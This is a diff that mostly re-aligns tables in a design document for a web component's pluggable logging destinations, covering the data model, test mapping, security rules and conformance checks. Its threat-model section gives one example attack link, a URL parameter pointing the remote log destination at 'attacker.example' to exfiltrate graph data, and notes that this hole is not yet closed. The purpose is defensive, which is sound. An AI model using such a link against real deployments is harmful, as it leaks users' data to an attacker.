@@ -25,10 +25,10 @@ section "Logging" (kept, with the correction in section 3 item 1).
 
 ## 2. Data model
 
-| Type | Entry point | Kind |
-| --- | --- | --- |
-| `Sink`, `LogSinkDescriptor`, `LogSinkRegistration` | `./logging`, `./extend` | implemented by extensions |
-| `LogRecord`, `LogLevel`, `formatLogRecord`, `LogSinkReference`, `GraphtyLogger` | `./logging` | called by extensions |
+| Type                                                                            | Entry point             | Kind                      |
+| ------------------------------------------------------------------------------- | ----------------------- | ------------------------- |
+| `Sink`, `LogSinkDescriptor`, `LogSinkRegistration`                              | `./logging`, `./extend` | implemented by extensions |
+| `LogRecord`, `LogLevel`, `formatLogRecord`, `LogSinkReference`, `GraphtyLogger` | `./logging`             | called by extensions      |
 
 `LogSinkDescriptor` rules: `id` non-empty, not `console` or `remote`, permanent; `plainName`
 non-empty; `description` a sentence; `options` an array (README section 7).
@@ -86,20 +86,20 @@ non-empty; `description` a sentence; `options` an array (README section 7).
 
 "Pinned by" names the test in `graphty-element/test/browser/extensions/logging-extension.test.ts`.
 
-| Capability | Pinned by |
-| --- | --- |
-| Receives every record at every level, from every module | "receives every record the element emits...", "...from more than one of its modules" |
-| Receives the whole record: time, level, category, message, data, the `Error` itself; TRACE distinct from DEBUG | the three "receives the whole record..." / "...failure itself..." / "sees a trace record..." tests |
-| Lazy values computed before delivery | "receives an expensive value already computed..." |
-| Renders a record as the console line | "renders a record into the same line the element prints..." |
-| Honours the global level and modules, and its own level and categories | the four level and category tests |
-| Attached and detached at run time, listed while attached, disposed on detach | "is attached and detached while the graph is running...", "is told to let go..." |
-| Isolated from another destination's throw, edit or failed flush | "keeps receiving records when another destination throws...", "cannot be changed by a destination that tried to edit...", "flushes on demand..." |
-| Can replace the console, and give it back | "takes the place of the element's console...", "gives the console back..." |
-| Listed in the catalogue | "is offered by the session's catalogue beside the element's own two destinations" |
-| Turned on by name, including from a stored configuration | "is turned on by a name in a configuration...", "...written to storage and read back" |
-| Options defaulted, validated, refused when unknown or out of range | "is built with the options its descriptor declares...", "refuses an option..." |
-| Unknown name refused; built-in id reserved | "is refused when a configuration names a destination nothing registered", "cannot take a name the element ships..." |
+| Capability                                                                                                     | Pinned by                                                                                                                                        |
+| -------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
+| Receives every record at every level, from every module                                                        | "receives every record the element emits...", "...from more than one of its modules"                                                             |
+| Receives the whole record: time, level, category, message, data, the `Error` itself; TRACE distinct from DEBUG | the three "receives the whole record..." / "...failure itself..." / "sees a trace record..." tests                                               |
+| Lazy values computed before delivery                                                                           | "receives an expensive value already computed..."                                                                                                |
+| Renders a record as the console line                                                                           | "renders a record into the same line the element prints..."                                                                                      |
+| Honours the global level and modules, and its own level and categories                                         | the four level and category tests                                                                                                                |
+| Attached and detached at run time, listed while attached, disposed on detach                                   | "is attached and detached while the graph is running...", "is told to let go..."                                                                 |
+| Isolated from another destination's throw, edit or failed flush                                                | "keeps receiving records when another destination throws...", "cannot be changed by a destination that tried to edit...", "flushes on demand..." |
+| Can replace the console, and give it back                                                                      | "takes the place of the element's console...", "gives the console back..."                                                                       |
+| Listed in the catalogue                                                                                        | "is offered by the session's catalogue beside the element's own two destinations"                                                                |
+| Turned on by name, including from a stored configuration                                                       | "is turned on by a name in a configuration...", "...written to storage and read back"                                                            |
+| Options defaulted, validated, refused when unknown or out of range                                             | "is built with the options its descriptor declares...", "refuses an option..."                                                                   |
+| Unknown name refused; built-in id reserved                                                                     | "is refused when a configuration names a destination nothing registered", "cannot take a name the element ships..."                              |
 
 Parity statements:
 
@@ -162,22 +162,22 @@ This is the extension point most likely to move graph data off the page.
    built-in `remote` destination with an arbitrary URL, which sends every record to that URL:
    a link carrying `?graphty-element-remote-log=https://attacker.example`, followed by an analyst,
    exfiltrates graph content without loading any code. Therefore:
-   - No configuration document (style, recipe, annotation, view, project) may carry a logging
-     configuration at all (README section 9.2 item 3).
-   - The `remote` destination, and any destination whose descriptor declares egress, MUST NOT be
-     enabled from stored or URL-derived configuration unless its origin is on an allowlist the
-     embedder set in code (open decision 13).
-   - `parseLoggingURLParams` MUST refuse to enable `remote` unless the embedder opted in.
-     **(not yet met)** It only checks that the value is a valid URL.
-   - The allowlist is not enough on its own: the SAME configuration also sets the global level
-     and category filters, and would set the proposed redaction. A tampered stored configuration
-     or a crafted link that lowers redaction to `"none"` and raises the level to TRACE sends every
-     record, in full, to a destination the embedder legitimately allowed. Therefore redaction,
-     and any level more verbose than the embedder's ceiling for egress destinations, MUST be
-     settable from code only; a stored or URL-derived configuration that sets them is refused
-     with `E_BAD_COMMAND` naming the member. The embedder lock of open decision 21 freezes the
-     logger policy (allowlist, redaction, the most verbose level egress destinations receive).
-   The element no longer reads the page URL by itself.
+    - No configuration document (style, recipe, annotation, view, project) may carry a logging
+      configuration at all (README section 9.2 item 3).
+    - The `remote` destination, and any destination whose descriptor declares egress, MUST NOT be
+      enabled from stored or URL-derived configuration unless its origin is on an allowlist the
+      embedder set in code (open decision 13).
+    - `parseLoggingURLParams` MUST refuse to enable `remote` unless the embedder opted in.
+      **(not yet met)** It only checks that the value is a valid URL.
+    - The allowlist is not enough on its own: the SAME configuration also sets the global level
+      and category filters, and would set the proposed redaction. A tampered stored configuration
+      or a crafted link that lowers redaction to `"none"` and raises the level to TRACE sends every
+      record, in full, to a destination the embedder legitimately allowed. Therefore redaction,
+      and any level more verbose than the embedder's ceiling for egress destinations, MUST be
+      settable from code only; a stored or URL-derived configuration that sets them is refused
+      with `E_BAD_COMMAND` naming the member. The embedder lock of open decision 21 freezes the
+      logger policy (allowlist, redaction, the most verbose level egress destinations receive).
+      The element no longer reads the page URL by itself.
 5. An option that is a credential (an API key, a DSN) is stored with the rest of the configuration
    and replayed; a destination MUST NOT take one as an option until a `secret` option type exists
    (README section 7 item 10).
@@ -194,21 +194,21 @@ This is the extension point most likely to move graph data off the page.
 
 Run by `checkLogSink(registration, { options })` in the proposed kit. All run in Node.
 
-| Check | Passes when |
-| --- | --- |
-| registers | `registerLogSink` accepts it; the catalogue lists the descriptor |
-| descriptor is valid | validates against `#/$defs/LogSinkDescriptor`; id not reserved |
-| registering attaches nothing | after registration and before configuration, `write` is never called |
-| attaches by name | `configure({ sinks: [{ use: id }] })` attaches the destination, listed under the descriptor id whatever `name` the factory returned, and a record reaches it |
-| options default and validate | defaults reach `create`; an undeclared or out-of-range option is refused |
-| write is synchronous | `write` returns `undefined` (not a promise) for the kit's record set |
-| does not mutate | the kit's frozen records are unchanged and no throw from a frozen write occurs |
-| does not recurse | `write` emits no record through `GraphtyLogger` |
-| survives a stored configuration | the configuration, serialised to JSON and read back, attaches it again |
-| disposes cleanly | after `removeSink`, `dispose` was called and no timer it created is alive |
-| flush settles | `flush`, when present, settles with the network unavailable before the kit's hang timeout |
-| egress matches its claim | with network calls trapped (README section 9.4 item 2's list), a destination that declares `destinations` contacts only those origins, and one that declares none contacts nothing |
-| no secret in the payload | loading a URL with a query token and running a test graph under the default redaction, no destination receives the token or any node id of the test graph in `message`, `data` or `error` (fails until section 7 item 2 is met) |
+| Check                           | Passes when                                                                                                                                                                                                                     |
+| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| registers                       | `registerLogSink` accepts it; the catalogue lists the descriptor                                                                                                                                                                |
+| descriptor is valid             | validates against `#/$defs/LogSinkDescriptor`; id not reserved                                                                                                                                                                  |
+| registering attaches nothing    | after registration and before configuration, `write` is never called                                                                                                                                                            |
+| attaches by name                | `configure({ sinks: [{ use: id }] })` attaches the destination, listed under the descriptor id whatever `name` the factory returned, and a record reaches it                                                                    |
+| options default and validate    | defaults reach `create`; an undeclared or out-of-range option is refused                                                                                                                                                        |
+| write is synchronous            | `write` returns `undefined` (not a promise) for the kit's record set                                                                                                                                                            |
+| does not mutate                 | the kit's frozen records are unchanged and no throw from a frozen write occurs                                                                                                                                                  |
+| does not recurse                | `write` emits no record through `GraphtyLogger`                                                                                                                                                                                 |
+| survives a stored configuration | the configuration, serialised to JSON and read back, attaches it again                                                                                                                                                          |
+| disposes cleanly                | after `removeSink`, `dispose` was called and no timer it created is alive                                                                                                                                                       |
+| flush settles                   | `flush`, when present, settles with the network unavailable before the kit's hang timeout                                                                                                                                       |
+| egress matches its claim        | with network calls trapped (README section 9.4 item 2's list), a destination that declares `destinations` contacts only those origins, and one that declares none contacts nothing                                              |
+| no secret in the payload        | loading a URL with a query token and running a test graph under the default redaction, no destination receives the token or any node id of the test graph in `message`, `data` or `error` (fails until section 7 item 2 is met) |
 
 ## 9. Worked example
 
@@ -230,7 +230,7 @@ registerLogSink({
         ],
     },
     create: (options): Sink => {
-        const capacity = options.capacity as number;   // the cast goes once typed options ship (README section 7 item 8)
+        const capacity = options.capacity as number; // the cast goes once typed options ship (README section 7 item 8)
         const lines: string[] = [];
         return {
             name: "acmexr-ring",
@@ -270,8 +270,8 @@ await GraphtyLogger.configure({ sinks: [{ use: "acmexr-ring", options: { capacit
 No design-studio persona or workflow names logging: its demand comes from third-party embedders and
 from operational-security constraints.
 
-| Need | Source |
-| --- | --- |
-| Diagnostics where no console is visible (headsets, kiosks, phones) | the element's XR support; `graphty-element/CLAUDE.md` |
-| Data must not leave the analyst's machine unannounced | `design/designloom/personas/cybersecurity-analyst.yaml`, `design/designloom/personas/intelligence-analyst.yaml` |
-| An embedder routing element diagnostics into its own error tracker | the architectural principle that a third party gets everything the graphty app gets (root `CLAUDE.md`) |
+| Need                                                               | Source                                                                                                          |
+| ------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------- |
+| Diagnostics where no console is visible (headsets, kiosks, phones) | the element's XR support; `graphty-element/CLAUDE.md`                                                           |
+| Data must not leave the analyst's machine unannounced              | `design/designloom/personas/cybersecurity-analyst.yaml`, `design/designloom/personas/intelligence-analyst.yaml` |
+| An embedder routing element diagnostics into its own error tracker | the architectural principle that a third party gets everything the graphty app gets (root `CLAUDE.md`)          |
